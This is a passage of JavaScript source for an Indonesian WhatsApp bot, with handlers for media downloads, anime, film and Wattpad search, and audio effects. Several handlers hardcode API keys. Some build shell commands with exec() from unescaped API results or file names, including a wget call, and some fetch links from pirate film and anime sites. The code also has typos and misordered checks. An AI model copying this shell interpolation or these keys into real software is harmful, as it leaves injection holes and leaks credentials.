                  break                                                  
                  case 'filmapikterbaru':
                 if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
				film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
				teks = '=================\n'
				for (let i of film.result) {
					teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break                                                  
				case 'filmapikdrama':
                 if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
				film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
				teks = '=================\n'
				for (let i of film.result) {
					teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break                                                  
//=====================================BATES NGAB=====================================\\
//searchmenu
				 case 'drakor':
                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=${lolKey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break                                                  
               
                case 'wattpadsearch':
                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pushname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break                                                  

case 'kusonime':
  teks = body.slice(8)
  zaki.updatePresence(from, Presence.composing)
  if (!isRegister) return reply(mess.only.daftarB)
  if (isLimit(sender)) return reply(mess.limitend)
  if (args.length < 1) return reply('*☒* Masukan nama animenya')
  try {
  data = await fetchJson(`https://api.xteam.xyz/anime/kusonime?q=${teks}&APIKEY=dd483007f0dca8d7`)
  hasil = `‣ *Judul* : ${data.title}\n‣ *Info* : ${data.info}\n‣ *Sinopsis* : ${data.sinopsis}\n‣ *Link download* :\n${data.link_dl}`
  buf = await getBuffer(data.thumb)
  zaki.sendMessage(from, buf, image, {
quoted: mek, caption: hasil
  })
  await limitAdd(sender)
  } catch {
    reply(mess.ferr)
  }
  break                                                  

                   case 'covidinfo':
                   zaki.updatePresence(from, Presence.composing) 
                   if (!isRegister) return reply(mess.only.daftarB)
                   if (isLimit(sender)) return reply(ind.limitend(pushname))
                   data = await fetchJson(`https://videfikri.com/api/covidindo/`)
                   if (data.result) reply(data.result)
                   hasil = ` *Negara : ${data.result.country}\nPositif : ${data.result.positif}\nSembuh : ${data.result.sembuh}\nMeninggal : ${data.result.meninggal}\nDalam Perawatan : ${data.result.dalam_perawatan}* `
                   reply(hasil)
                   await limitAdd(sender)
                   break                                                  
				case 'wiki':
					if (args.length < 1) return reply('masukan kata kunci')
					tels = body.slice(6)	
                                        if (!isRegister) return reply(mess.only.daftarB)				
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/wiki?q=${tels}&apikey=${apitobz}`, {method: 'get'})
					reply(anu.result)
                                        await limitAdd(sender)
					break                                                  	
				case 'wikien':
					if (args.length < 1) return reply('masukan kata kunci')
					tels = body.slice(8)		
			                if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					anu = await fetchJson(`https://arugaz.my.id/api/edu/enwiki?query=${tels}`, {method: 'get'})
					reply(anu.result)
                                        await limitAdd(sender)
					break                                                  				
						case 'ytmp4':
        await limitAdd(sender)
        if (!isRegister) return reply(mess.only.daftarB)

			if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (!isUrl(args[0]) && !args[0].includes('youtu.be')) return reply('Link tidak valid')
        reply(ind.wait)
        anu = await y2mateV(q).catch(e => {
          reply('_Error!_')
        })
        acamp4 = `\`\`\`「 YouTube Downloader 」\`\`\`
				
◉ *Judul :* ${anu[0].judul}
◉ *Ukuran :* ${anu[0].size}

[WAIT] Proses Dumlu Yakan...`
        infomp4 = await getBuffer(anu[0].thumb)
        info_bro = `*Title :* ${anu[0].judul}\n*Size :* ${anu[0].size} \n\nSupport *HLX BOT* Dengan Follow :\nInstagram.com/ahmadzaki_yo`
        zaki.sendMessage(from, infomp4, image, {
          quoted: mek,
          caption: acamp4
        })
        vidionye = await getBuffer(anu[0].link)
        zaki.sendMessage(from, vidionye, video, {
          mimetype: 'video/mp4',
          filename: `${anu[0].output}`,
          quoted: mek,
          caption: info_bro
        })
        await limitAdd(sender) 
        break                                                  
      case 'ytmp3':
        await limitAdd(sender)
        if (!isRegister) return reply(mess.only.daftarB)
			if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (!isUrl(args[0]) && !args[0].includes('youtu.be')) return reply('Link tidak valid')
        reply(ind.wait)
        anu = await y2mateV(q).catch(e => {
          reply('_Error!_')
        })
        acamp4 = `\`\`\`「 YouTube Downloader 」\`\`\`
				
◉ *Judul :* ${anu[0].judul}
◉ *Ukuran :* ${anu[0].size}

[WAIT] Proses Dumlu Yakan...`
        infomp4 = await getBuffer(anu[0].thumb)
        zaki.sendMessage(from, infomp4, image, {
          quoted: mek,
          caption: acamp4
        })
        vidionye = await getBuffer(anu[0].link)
        zaki.sendMessage(from, vidionye, document, {
          mimetype: 'audio/mp3',
          filename: `${anu[0].judul}.mp3`,
          quoted: mek
        })
        await limitAdd(sender) 
        break                                                  
// Downloader
        case 'drivevid':
case 'gdrivev':
case 'gdrive':
if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (args.length < 1) return reply(`Contoh : ${prefix + command} https://drive.google.com/uc?id=1lBYJ0I-qJH9IsbCid-AsZosepX4-UJet&export=download`) 
        reply(ind.wait)
url = body.slice(10) 
hans = await fetchJson(`https://api.zeks.xyz/api/gdbypass?apikey=${apizeks}&url=${url}`) 
teks = `Filename : ${hans.data.file_name} \n\nSupport *HLX BOT* Dengan Follow ;\nInstagram.com/ahmadzaki_yo`
buper = await getBuffer(hans.result.direct_download) 
zaki.sendMessage(from, buper, video, {
          mimetype: 'video/mp4',
          filename: `hlxbot.mp4`,
          quoted: mek,
          caption: teks
        })
        await limitAdd(sender)
        break                                                  
         case 'wattpad':
                if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpad?apikey=${lolKey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    zaki.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break                                       
       case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return reply('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    zaki.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    zaki.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break  
	   
	    case 'linkgrubwa':
          if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
          await limitAdd(sender) 
            if(!q) return reply('cari group apa?')

            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
	    
	     case 'igstory': 

            if(!q) return reply('Usernamenya?')

            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    zaki.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    zaki.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
	 
      case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return reply('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		zaki.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return reply('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break                                                  

        // Random Menu
      case 'bahasapurba':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (args.length < 1) return reply('kasih teks lah^_^!!!')
        purba = body.slice(7)
        anu = await fetchJson(`http://lolhuman.herokuapp.com/api/bahasapurba?apikey=${lolKey}&text=${purba}`, {
          method: 'get'
        })
        reply(anu.result)
        await limitAdd(sender)
        break                                
        
        case 'image':
            if (args.length < 1) return reply('Masukan teks!')

            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            zaki.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
        
      case 'shutdown':
      case 'hlxtidur':
        if (!isOwner) return reply(ind.ownerb())
        await zaki.sendMessage(from, `_Bye..._\n_*HLX BOT* Tidur Dulu_`, text, {
          quoted: mek
        })
        zaki.close()
        break                                                  
case 'citacita':
            if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
                reply (mess.wait)
                anu = await getBuffer(`https://pencarikode.xyz/api/cita-cita?apikey=pais`)
        
                zaki.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', filename: 'citacita.mp3', quoted: mek, ptt: true})
                await limitAdd(sender) 
                break                                                   
  
			  	 case 'ytsch':
           case 'ytsearch':

           
					if (!isRegister) return reply(mess.only.daftarB)
					if (isLimit(sender)) return reply(ind.limitend(pushname))
					await limitAdd(sender)
					reply(mess.wait)
            if (!args.length) return reply('Judulnya apa kak?')
            try {
                const input = args.join(" ")
                const filter1 = await ytsr.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsr(filters1.url, { limit: 10 })

                let hehe = `┌ ◪ *YOUTUBE SEARCH*
└ *Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ ❏ *Judul:* ${items[i].title}
├ ❏ *Id:* ${items[i].id}
├ ❏ *Ditonton:* ${items[i].views}
├ ❏ *Durasi:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await zaki.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link youtube] = Audio
└ ${prefix}ytmp4 [link youtube] = Video`})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
			
case 'shopee':

                if (!isRegister) return reply(mess.only.daftarB)

				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/shopee?apikey=${lolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break                                                  
                case 'google':
                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gsearch?apikey=${lolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += ` Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break                                                  
                case 'stickerwa':
                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolKey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${lolKey}&img=${x}`)
                        zaki.sendMessage(from, ini_buffer, sticker)
                    }
                    break                                                  
 case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '=================\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n=================`
            }
            reply(store)
            break                                                  
case 'doramaindo':
			 	  if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
					reply (mess.wait)
					F = body.slice(10)
					anu = await fetchJson(`https://x-restapi.herokuapp.com/api/doramaindo-search?q=${F}eapikey=BETA`, {method: 'get'})
					
					buffer = await getBuffer(anu.result.image)
					if (anu.error) return reply(anu.error)
					teks = '=================\n'
					for (let i of anu.data) {
						teks += `\`\`\`Title\`\`\` : *${i.title}\n\`\`\`Status\`\`\` : *${i.status}*\n\`\`\`Url\`\`\` : *${i.source}*\n\`\`\`Genre\`\`\` : *${i.genre}*\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender) 
					break                                                  
case 'anoboy':
			 	  if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
					reply (mess.wait)
					anu = await fetchJson(`https://pencarikode.xyz/api/ongoing-anoboy?apikey=pais`, {method: 'get'})
					
					buffer = await getBuffer(anu.result.thumb)
					if (anu.error) return reply(anu.error)
					teks = '=================\n'
					for (let i of anu.result) {
						teks += `\`\`\`Title\`\`\` : *${i.title}*\n\`\`\`Update\`\`\` : *${i.jamup}*\n\`\`\`Link\`\`\` : *${i.link}*\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender) 
					break                                                  
					case 'otaku':
            if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
          await limitAdd(sender) 
					reply (mess.wait)
            if(!q) return reply('judul animenya?')

            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            zaki.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
           
            
    case 'komiku':
      if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
          await limitAdd(sender) 
					reply (mess.wait)
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
      if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
          await limitAdd(sender) 
					reply (mess.wait)
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await zaki.sendMessage(from,li,image,{quoted: mek})
            break
    case 'pinterest':
      if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
          await limitAdd(sender) 
					reply (mess.wait)
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await zaki.sendMessage(from,di,image,{quoted: mek})
            break
            
case 'jadwalbioskop':
			 	  if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
					reply (mess.wait)
					anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/jadwal-bioskop?apikey=42c3c28f14336bc19a`, {method: 'get'})
					
					buffer = await getBuffer(anu.result.img)
					if (anu.error) return reply(anu.error)
					teks = '=================\n'
					for (let i of anu.result) {
						teks += `\`\`\`Title\`\`\` : *${i.title}*\n\`\`\`Url\`\`\` : *${i.url}*\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender) 
					break                                                  

case 'filmsearch':
			 	  if (!isRegister) return reply(mess.only.daftarB)
          if (isLimit(sender)) return reply(ind.limitend(pushname))
					if (args.length < 1) return reply('Nama Film nya apa kak?')
					reply (mess.wait)
					anu = await fetchJson(`https://zaki-api.herokuapp.com/api/lk21/search?film=${body.slice(10)}&apikey=zakigans`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Title* : *${anu.result.title}*\n*Genre* : *${anu.result.genre}*\n*Rating* : *${anu.result.rating}*\n*Duration* : *${anu.result.duration}*\n*Quality*: *${anu.result.quality}*\n*Trailer* : *${anu.result.tailer}*\n*watch* : *${anu.result.watch}*\n=================\n`
					
					reply(teks)
					await limitAdd(sender) 
					break                                                  
		
				case 'trendtwit':
					zaki.updatePresence(from, Presence.composing) 
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/trendingtwitter`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Hastag* : ${i.hastag}\n*link* : ${i.link}\n*rank* : ${i.rank}\n*Tweet* : ${i.tweet}\n=================\n`
					}
					reply(teks.trim())
                                        await limitAdd(sender)
					break                                                  
				case 'testime':
					setTimeout( () => {
					zaki.sendMessage(from, 'Waktu habis:v', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zaki.sendMessage(from, '5 Detik lagi', text) // ur cods
					}, 5000) // 1000 = 1s,
					setTimeout( () => {
					zaki.sendMessage(from, '10 Detik lagi', text) // ur cods
					}, 0) // 1000 = 1s,
					break                                                  
case 'smeme':


					if (!isRegister) return reply(mess.only.daftarB)
									 var tex1 = body.slice(7).split('|')[0]
var tex2 = body.slice(7).split('|')[1]
if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
                                          ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        owgi = await zaki.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `https://pecundang.herokuapp.com/api/memegen2?teks1=${tex1}&teks2=${tex2}&img_url=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break                                                  
				case 'emoji':
				     if (!isRegister) return reply(mess.only.daftarB)
             if (isLimit(sender)) return reply(ind.limitend(pushname))
			if (!q) return reply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
   			await limitAdd(sender)
    		break                                                  
				case 'nulis':
				case 'tulis':
					if (args.length < 1) return reply('Yang mau di tulis apaan?')
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					teks = body.slice(7)
					reply (mess.wait)
					anu = await fetchJson(`https://api.zeks.xyz/api/nulis?text=${teks}&apikey=${apizeks}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buff = await getBuffer(anu.result)
					zaki.sendMessage(from, buff, image, {quoted: mek, caption: ind.success()})
                                        await limitAdd(sender)
					break                                                  


                case 'quotesanime':

                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolKey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n* ${char}*\n* ${anime} ${episode}*`)
                    break                                                  
                case 'quotesdilan':
                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    quotedilan = await fetchJson(`http://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolKey}`)
                    reply(quotedilan.result)
                    break                                                  

				case 'joox':
			tels = body.slice(6)
                data = await fetchJson(`https://pencarikode.xyz/download/joox?search=${tels}&apikey=pais`, {method: 'get'})
               if (!isRegister) return reply(mess.only.daftarB)
               if (isLimit(sender)) return reply(ind.limitend(pushname))
               if (data.error) return reply(data.error)
                 infomp3 = `*Lagu Ditemukan!!!*\nJudul : ${data.result.judul}\nArtis : ${data.result.artist}\nAlbum : ${data.result.album}\nSize : ${data.result.filesize}\nDuration : ${data.result.duration}`
                buffer = await getBuffer(data.result.img_url)
                lagu = await getBuffer(data.result.mp3_url)
                zaki.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                zaki.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${data.result.title}.mp3`, quoted: mek})
                await limitAdd(sender)
                break                                                  
 					
				case 'blocklist':
					teks = 'This is list of blocked number :\n'
					for (let block of blocked) {
						teks += `~> @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					zaki.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					break                                                  
                   case 'chatlist':
					zaki.updatePresence(from, Presence.composing)  
					teks = 'This is list of chat number :\n'
					for (let all of totalchat) {
						teks += `~> @${all}\n`
					}
					teks += `Total : ${totalchat.length}`
					zaki.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": totalchat}})
					break                                                  
				case 'animecry':
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry&apikey=${apitobz}`, {method: 'get'})
                                        if (!isRegister) return reply(mess.only.daftarB)
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						buffer = fs.readFileSync(rano)
						zaki.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break                                                  
				case 'neonime':
					zaki.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/neonime_lastest`, {method: 'get'})
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					teks = '################\n'
					for (let i of data.result) {
						teks += `*Title* : ${i.judul}\n*link* : ${i.link}\n*rilis* : ${i.rilis}\n###############\n`
					}
					reply(teks.trim())
                                        await limitAdd(sender)
					break                                                    
					case 'bpink':
              
                  if (args.length < 1) return reply(`Masukan Teks\nContoh : ${prefix}Caliph Bot`)
                data = await getBuffer(`https://docs-jojo.herokuapp.com/api/blackpink?text=${body.slice(7)}`)
                if (!iRegister) return reply(mess.only.daftarB)
                if (isLimit(sender)) return reply(ind.limitend(pushname))
                zaki.sendMessage(from, data, image, {quoted: mek, caption: body.slice(7)})
                await limitAdd(sender)
                break                                                  
//AUDIO
				case 'tts':
				   zaki.updatePresence(from, Presence.recording) 
				   if (args.length < 1) return zaki.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: mek})
                                   if (!isRegister) return reply(mess.only.daftarB)
                                   if (isLimit(sender)) return reply(ind.limitend(pushname))
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return zaki.sendMessage(from, 'Textnya mana om', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('Gagal om:(')
							zaki.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
                                        await limitAdd(sender)
					break                                                  
case 'slow':
					low = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					slo = await zaki.downloadAndSaveMediaMessage(low)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(slo)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break                                                  
				case 'tupai':
					pai = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					tup = await zaki.downloadAndSaveMediaMessage(pai)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(tup)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break                                                  
				case 'gemuk':
					muk = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					gem = await zaki.downloadAndSaveMediaMessage(muk)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(gem)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break                                                  
				case 'bass':                 
					ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					bas = await zaki.downloadAndSaveMediaMessage(ass)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(bas)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
